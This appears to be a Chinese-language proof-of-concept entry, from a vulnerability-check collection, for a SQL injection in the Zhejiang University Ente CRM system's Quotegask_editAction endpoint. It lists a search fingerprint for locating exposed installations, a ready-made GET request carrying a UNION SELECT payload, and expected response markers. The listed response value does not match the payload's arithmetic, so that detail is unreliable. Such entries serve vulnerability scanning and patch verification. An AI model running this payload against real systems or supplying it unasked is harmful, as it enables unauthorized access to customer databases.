﻿# 浙大恩特客户资源管理系统 Quotegask_editAction-sql SQL注入漏洞

> 更新时间：2024-03-29

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：title="欢迎使用浙大恩特客户资源管理系统" || body="ｓｃｒｉｐｔ/Ent.base.js" || app="浙大恩特客户资源管理系统"

> 验证脚本：HTTP

```
GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+SELECT+520*1314--+&method=goonumIsExist HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：56088

> 上传文件定位：

> 验证文件来源：浙大恩特客户资源管理系统 Quotegask_editAction-sql SQL注入漏洞.poc

